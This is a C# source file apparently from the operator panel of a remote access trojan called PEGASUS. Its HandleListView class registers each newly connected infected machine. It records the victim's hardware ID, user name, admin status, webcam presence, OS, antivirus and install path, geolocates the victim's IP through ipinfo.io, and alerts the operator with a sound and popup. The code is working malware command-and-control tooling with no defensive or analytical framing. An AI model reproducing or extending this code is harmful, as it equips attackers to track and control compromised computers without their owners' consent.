using System;
using System.Drawing;
using System.IO;
using System.Media;
using System.Net;
using System.Windows.Forms;
using custom_alert_notifications;
using PEGASUS.Diadyktio;
using PEGASUS.Metafora_Dedomenon;
using PEGASUS.Properties;

namespace PEGASUS.BytesInOut
{
	public class HandleListView
	{
		public void AddToListview(Clients client, MsgPack unpack_msgpack)
		{
			try
			{
				lock (Settings.LockBlocked)
				{
					try
					{
						if (Settings.Blocked.Count > 0)
						{
							if (Settings.Blocked.Contains(unpack_msgpack.ForcePathObject("HWID").AsString))
							{
								client.Disconnected();
								return;
							}
							if (Settings.Blocked.Contains(client.Ip))
							{
								client.Disconnected();
								return;
							}
						}
					}
					catch
					{
					}
				}
				client.Admin = false;
				if (unpack_msgpack.ForcePathObject("Admin").AsString.ToLower() != "user")
				{
					client.Admin = true;
				}
				client.LV = new ListViewItem
				{
					Tag = client,
					Text = $"{client.Ip}:{client.TcpClient.LocalEndPoint.ToString().Split(':')[1]}"
				};
				try
				{
					string location = GetLocation(client.TcpClient.RemoteEndPoint.ToString().Split(':')[0]);
					string text = "\"country\":";
					string text2 = location.Substring(location.IndexOf(text) + text.Length).Replace("\"", "").Replace(":", "");
					int num = text2.LastIndexOf(",");
					if (num > 0)
					{
						text2 = text2.Substring(0, num);
					}
					string text3 = text2.Split(',')[0].Trim();
					client.LV.SubItems.Add(text3);
				}
				catch
				{
					client.LV.SubItems.Add("Unknown");
				}
				string location2 = GetLocation(client.TcpClient.RemoteEndPoint.ToString().Split(':')[0]);
				client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Group").AsString);
				client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("CPU/GPU").AsString);
				client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("GPU RAM").AsString);
				client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("HWID").AsString);
				client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("User").AsString);
				client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Camera").AsString);
				client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("OS").AsString);
				client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Version").AsString);
				try
				{
					client.LV.SubItems.Add(Convert.ToDateTime(unpack_msgpack.ForcePathObject("Install_ed").AsString).ToLocalTime().ToString());
				}
				catch
				{
					try
					{
						client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Install_ed").AsString);
					}
					catch
					{
						client.LV.SubItems.Add("??");
					}
				}
				client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Admin").AsString);
				client.LV.SubItems.Add(unpack_msgpack.ForcePathObject("Anti_virus").AsString);
				client.LV.SubItems.Add("0000 MS");
				client.LV.SubItems.Add("...");
				client.LV.ToolTipText = "[Path] " + unpack_msgpack.ForcePathObject("Path").AsString + Environment.NewLine + " [Geo Location] " + location2.Replace("\"", "").Replace(",", "").Replace(":", "")
					.Replace(" ", Environment.NewLine) + Environment.NewLine;
				client.ID = unpack_msgpack.ForcePathObject("HWID").AsString;
				client.LV.UseItemStyleForSubItems = false;
				client.LastPing = DateTime.Now;
				Program.form1.Invoke((MethodInvoker)delegate
				{
					lock (Settings.LockListviewClients)
					{
						Program.form1.listView1.Items.Add(client.LV);
						Program.form1.listView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
						Program.form1.lv_act.Width = 500;
					}
					if (PEGASUS.Properties.Settings.Default.Notification)
					{
						string info = "Client " + client.Ip + " connected\nGroup:" + unpack_msgpack.ForcePathObject("Group").AsString + "\nUser:" + unpack_msgpack.ForcePathObject("User").AsString + "\nOS:" + unpack_msgpack.ForcePathObject("OS").AsString + "\nUser:" + unpack_msgpack.ForcePathObject("Admin").AsString;
						ShowPopup(info);
					}
				});
			}
			catch
			{
			}
		}

		public void ShowPopup(string info)
		{
			try
			{
				if (Program.form1.chkSounds.Checked)
				{
					SoundPlayer soundPlayer = new SoundPlayer(Resources.Online);
					soundPlayer.Load();
					soundPlayer.Play();
				}
				alert.Show(info, alert.AlertType.success);
			}
			catch (InvalidOperationException)
			{
			}
		}

		public void Received(Clients client)
		{
			try
			{
				lock (Settings.LockListviewClients)
				{
					if (client.LV != null)
					{
						client.LV.ForeColor = Color.FromArgb(198, 25, 31);
					}
				}
			}
			catch
			{
			}
		}

		public static string GetLocation(string ip)
		{
			string text = "";
			using WebResponse webResponse = WebRequest.Create("http://ipinfo.io/" + ip).GetResponse();
			using StreamReader streamReader = new StreamReader(webResponse.GetResponseStream());
			string text2;
			while ((text2 = streamReader.ReadLine()) != null)
			{
				text += text2;
			}
			return text;
		}
	}
}
